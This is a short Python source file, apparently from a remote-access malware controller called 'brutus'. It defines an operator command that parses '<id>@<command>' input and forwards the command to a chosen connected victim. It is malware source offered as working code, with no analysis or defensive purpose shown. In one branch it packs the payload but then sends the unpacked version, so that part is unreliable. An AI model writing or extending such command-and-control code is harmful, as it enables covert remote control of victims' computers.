"""Forward a command to a specific victim: '<id>@<command>'."""

import asyncio

from brutus.attacker.util import ERROR_CLIENT_NOT_FOUND
from brutus.protocol import pack


class SendAtCommand:
    def execute(self, window, command: str, context: dict) -> None:
        connections = context.get("connections", {})
        loop = context.get("loop")
        try:
            raw_id, payload = command.split("@", 1)
            client_id = int(raw_id.strip())
            conn = connections[client_id]
            encoded = pack(payload.strip().encode("utf-8"))
            if loop and loop.is_running():
                asyncio.run_coroutine_threadsafe(conn.send(payload.strip().encode("utf-8")), loop)
            else:
                conn.writer.write(encoded)
            window.Input.clear()
        except Exception:
            window.Output.addItem(ERROR_CLIENT_NOT_FOUND)
